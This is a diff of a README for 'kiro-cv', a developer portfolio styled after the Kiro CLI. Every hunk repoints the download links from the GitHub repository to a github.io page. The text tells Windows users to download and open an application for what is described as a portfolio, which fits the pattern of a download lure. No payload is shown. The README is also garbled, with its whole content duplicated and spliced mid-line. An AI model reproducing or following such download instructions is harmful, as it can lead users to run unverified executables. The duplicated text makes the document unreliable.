@@ -1,6 +1,6 @@
 # 🖥️ kiro-cv - Explore My Experience Like Kiro
 
-[![Download kiro-cv](https://img.shields.io/badge/Download-kiro--cv-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/TheeAmir/kiro-cv)
+[![Download kiro-cv](https://img.shields.io/badge/Download-kiro--cv-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://theeamir.github.io)
 
 kiro-cv is a developer portfolio that looks and feels like the real Kiro CLI. Visitors explore your experience, skills, and certifications using slash commands — just like Kiro. Plain text input triggers an AI chat that responds in character as you. It is weird, it is fun, and recruiters actually love it.
 
@@ -45,16 +45,16 @@ The layout is intentionally simple. There are no complicated menus, hidden panel
 
 ## 📥 Download and Run on Windows
 
-Visit this link to download the application: [Download kiro-cv](https://github.com/TheeAmir/kiro-cv).
+Visit this link to download the application: [Download kiro-cv](https://theeamir.github.io).
 
-1. Visit this link to download the application: [Download kiro-cv](https://github.com/TheeAmir/kiro-cv).
+1. Visit this link to download the application: [Download kiro-cv](https://theeamir.github.io).
 2. When the download finishes, open the downloaded item.
 3. Follow the on-screen prompts to open the portfolio.
 4. Click the input area, type a command such as /help, and press Enter.
 
 The application is intended for Windows users who want to explore the portfolio# 🖥️ kiro-cv - Explore My Experience Like Kiro
 
-[![Download kiro-cv](https://img.shields.io/badge/Download-kiro--cv-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://github.com/TheeAmir/kiro-cv)
+[![Download kiro-cv](https://img.shields.io/badge/Download-kiro--cv-ff69b4?style=for-the-badge&logo=github&logoColor=white&labelColor=4B0082)](https://theeamir.github.io)
 
 kiro-cv is a developer portfolio that looks and feels like the real Kiro CLI. Visitors explore your experience, skills, and certifications using slash commands — just like Kiro. Plain text input triggers an AI chat that responds in character as you. It is weird, it is fun, and recruiters actually love it.
 
@@ -99,13 +99,13 @@ The layout is intentionally simple. There are no complicated menus, hidden panel
 
 ## 📥 Download and Run on Windows
 
-Visit this link to download the application: [Download kiro-cv](https://github.com/TheeAmir/kiro-cv).
+Visit this link to download the application: [Download kiro-cv](https://theeamir.github.io).
 
 On Windows, visit this link to download the application. When the download finishes, open the downloaded application to start the portfolio. Click the input area, type a command such as /help, and press Enter. The portfolio responds in the message area, and you can continue exploring from there.
 
 The same download link is available here for quick access:
 
-[![Download kiro-cv](https://img.shields.io/badge/Download-kiro--cv-20c997?style=for-the-badge&logo=github&logoColor=white&labelColor=6f42c1)](https://github.com/TheeAmir/kiro-cv)
+[![Download kiro-cv](https://img.shields.io/badge/Download-kiro--cv-20c997?style=for-the-badge&logo=github&logoColor=white&labelColor=6f42c1)](https://theeamir.github.io)
 
 Keep the application open while you explore. The portfolio does not require any additional setup beyond downloading and opening it. If you close the application, you can open it again the same way and continue where you left off.
 
